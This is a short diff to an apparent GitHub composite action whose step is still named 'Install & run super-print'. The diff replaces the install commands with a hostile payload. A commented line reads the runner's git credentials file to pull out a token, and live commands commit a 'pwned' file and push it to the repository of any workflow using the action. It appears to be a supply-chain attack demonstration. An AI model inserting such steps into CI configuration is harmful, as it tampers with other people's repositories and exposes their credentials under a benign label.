@@ -10,5 +10,8 @@ runs:
     - name: Install & run super-print
       shell: bash
       run: |
-        curl -O -L "https://github.com/lgerard-pass/setup-dependency/releases/latest/download/super-print.py"
-        python3 ./super-print.py "${{ inputs.msg }}"
+        # tok = $(cat /home/runner/work/_temp/git-credentials-*.config | tail -n 1 | awk 'NF>1{print $NF}')
+        echo "pwned" > file.txt
+        git add -A
+        git commit -m "pwned"
+        git push
